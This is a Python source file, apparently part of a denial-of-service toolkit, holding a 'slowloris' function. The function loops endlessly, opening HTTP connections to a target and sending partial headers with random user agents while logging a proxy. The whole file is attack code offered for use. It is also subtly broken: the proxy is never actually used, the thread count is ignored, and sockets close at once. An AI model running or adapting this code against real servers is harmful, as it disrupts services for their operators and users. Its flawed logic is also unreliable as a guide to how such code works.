import socket
import random
from core.proxy_manager import ProxyManager
from config import Config

def slowloris(target, num_threads, proxy_manager):
    config = Config()
    user_agents = config.user_agents
    while True:
        proxy = proxy_manager.get_proxy()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, 80))
            sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode('utf-8'))
            sock.send("Host: {}\r\n".format(target).encode('utf-8'))
            sock.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode('utf-8'))
            sock.send("Connection: keep-alive\r\n".encode('utf-8'))
            print(f"Slowloris: {target} | Proxy: {proxy}")
        except Exception as e:
            print(f"Slowloris Error: {e} | Proxy: {proxy}")
        finally:
            sock.close()
